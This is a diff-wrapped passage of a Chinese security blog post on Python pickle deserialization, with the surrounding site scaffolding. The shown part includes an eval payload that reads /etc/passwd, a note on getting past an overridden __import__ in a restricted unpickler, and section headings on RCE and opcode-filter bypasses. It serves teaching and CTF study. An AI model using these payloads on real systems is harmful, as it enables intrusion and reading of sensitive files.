class="built_in">eval</span>(<span class="string">&#x27;print(open(&quot;/etc/passwd&quot;).read())&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large red">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>注意</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>这里已经将 <code>__import__</code> 函数进行了覆盖，因此不能再使用 <code>eval(&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code> 来执行系统命令，但是可以使用 <code>open</code> 函数来读取文件内容。</p>
+<p>有些题目会在自定义 <code>find_class</code> 里直接**调用原版的 <code>pickle.Unpickler.find_class</code>**，而不是自己去 <code>__import__</code>：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(...)</span><br><span class="line">    <span class="keyword">return</span> pickle.Unpickler.find_class(<span class="variable language_">self</span>, module, name)</span><br></pre></td></tr></table></figure></div>
+
+<p>这种调用等于让 <strong>C 实现的反序列化代码</strong>（内部逻辑）直接去解析全局名、导入模块，不会经过我们改过的 <code>__import__</code>（或者即便经过，也会在更早阶段做安全检查）。</p>
+
+    </div>
+  </div>
+
+<h4 id="方法创建"><a href="#方法创建" class="headerlink" title="方法创建"></a>方法创建</h4><h4 id="利用代码对象篡改函数"><a href="#利用代码对象篡改函数" class="headerlink" title="利用代码对象篡改函数"></a>利用代码对象篡改函数</h4><h4 id="利用-load-build-RCE"><a href="#利用-load-build-RCE" class="headerlink" title="利用 load_build RCE"></a>利用 load_build RCE</h4><h4 id="利用-load-newobj-RCE"><a href="#利用-load-newobj-RCE" class="headerlink" title="利用 load_newobj RCE"></a>利用 load_newobj RCE</h4><h2 id="绕过操作码过滤"><a href="#绕过操作码过滤" class="headerlink" title="绕过操作码过滤"></a>绕过操作码过滤</h2><h3 id="绕过字符串过滤"><a href="#绕过字符串过滤" class="headerlink" title="绕过字符串过滤"></a>绕过字符串过滤</h3><h3 id="绕过-R-操作码过滤"><a href="#绕过-R-操作码过滤" class="headerlink" title="绕过 R 操作码过滤"></a>绕过 R 操作码过滤</h3>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Pickle 反序列化</li>
+        <li><strong>Author:</strong> sky123</li>
+        <li><strong>Created at
+                :</strong> 2025-08-11 23:58:04</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-11 23:57:48
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://skyi23.github.io/2025/08/11/Pickle 反序列化/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/python-web/">#python web</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/08/12/Python%20%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Python 沙箱逃逸</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/11/PHP%20%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">PHP 原生类利用</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'skyI23/my-giscus-discussions',
+                'data-repo-id': 'R_kgDONL9k_w',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'bottom',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Pickle 反序列化</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-text">基本使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="nav-text">基础用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">自定义序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#reduce-reduce-ex"><span class="nav-text">reduce &#x2F; reduce_ex</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getstate-setstate"><span class="nav-text">getstate &#x2F; setstate</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E5%AF%B9%E8%B1%A1%E5%8A%A0%E8%BD%BD"><span class="nav-text">限制对象加载</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pickle-%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">Pickle 字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="nav-text">反序列化原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%8C%87%E4%BB%A4"><span class="nav-text">字节码指令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E4%B8%8E%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%8C%87%E4%BB%A4"><span class="nav-text">栈与流程控制指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E9%87%8F%E4%B8%8E%E6%A0%87%E9%87%8F%EF%BC%88%E6%96%87%E6%9C%AC%E7%BC%96%E7%A0%81%EF%BC%89"><span class="nav-text">常量与标量（文本编码）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%B9%E5%99%A8%E6%9E%84%E9%80%A0%E6%8C%87%E4%BB%A4"><span class="nav-text">容器构造指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%87%E5%BF%98%E5%BD%95%EF%BC%88memo%EF%BC%89%E6%8C%87%E4%BB%A4"><span class="nav-text">备忘录（memo）指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E6%9E%84%E9%80%A0%E4%B8%8E%E6%89%A7%E8%A1%8C"><span class="nav-text">对象构造与执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96%E9%92%A9%E5%AD%90"><span class="nav-text">持久化钩子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%83%85%E6%99%AF"><span class="nav-text">常见情景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-text">覆盖全局变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="nav-text">函数调用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#REDUCE-R-%E8%B7%AF%E5%BE%84"><span class="nav-text">REDUCE (R) 路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#INST-i-%E8%B7%AF%E5%BE%84"><span class="nav-text">INST (i) 路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OBJ-o-%E8%B7%AF%E5%BE%84"><span class="nav-text">OBJ (o) 路径</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="nav-text">实例化对象</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pker-%E7%BC%96%E5%86%99%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">pker 编写字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E4%BB%A3%E7%A0%81"><span class="nav-text">工具代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">使用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%85%A5%E4%BC%98%E5%85%88%E7%BA%A7"><span class="nav-text">输入优先级</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%85%A5%E6%A8%A1%E5%BC%8F"><span class="nav-text">输入模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F"><span class="nav-text">输出格式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="nav-text">支持的语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B5%8B%E5%80%BC%EF%BC%88%E5%8F%98%E9%87%8F%E4%BC%9A%E5%AD%98%E5%85%A5-pickle-%E7%9A%84-memo-%E8%A1%A8%EF%BC%89"><span class="nav-text">赋值（变量会存入 pickle 的 memo 表）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-1"><span class="nav-text">函数调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#return%EF%BC%88%E9%A1%B6%E5%B1%82%E5%8F%AF%E7%94%A8%EF%BC%89"><span class="nav-text">return（顶层可用）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%AE%8F%E8%AF%B4%E6%98%8E"><span class="nav-text">内置宏说明</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GLOBAL-module-name"><span class="nav-text">GLOBAL(module, name)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#INST-module-name-args"><span class="nav-text">INST(module, name, *args)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OBJ-callable-args"><span class="nav-text">OBJ(callable, *args)</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-text">反序列化绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-Restricted-Unpickler"><span class="nav-text">绕过 Restricted Unpickler</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-text">绕过黑名单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%9C%AA%E8%A2%AB%E9%99%90%E5%88%B6%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">寻找未被限制的利用链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-text">绕过白名单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E5%8A%AB%E6%8C%81"><span class="nav-text">模块劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81"><span class="nav-text">属性创建与函数劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%88%9B%E5%BB%BA"><span class="nav-text">方法创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E5%AF%B9%E8%B1%A1%E7%AF%A1%E6%94%B9%E5%87%BD%E6%95%B0"><span class="nav-text">利用代码对象篡改函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-load-build-RCE"><span class="nav-text">利用 load_build RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-load-newobj-RCE"><span class="nav-text">利用 load_newobj RCE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%93%8D%E4%BD%9C%E7%A0%81%E8%BF%87%E6%BB%A4"><span class="nav-text">绕过操作码过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4"><span class="nav-text">绕过字符串过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-R-%E6%93%8D%E4%BD%9C%E7%A0%81%E8%BF%87%E6%BB%A4"><span class="nav-text">绕过 R 操作码过滤</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        47 posts in total
+                    </span>
+                    
+                        <span>
+                            758.1k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+    
+        
+<script src="/js/build/libs/mermaid.min.js"></script>
+
+    
+    
+<script src="/js/build/plugins/mermaid.js"></script>
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+    
+<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>
+
+
+	
+</body>
+
+</html>
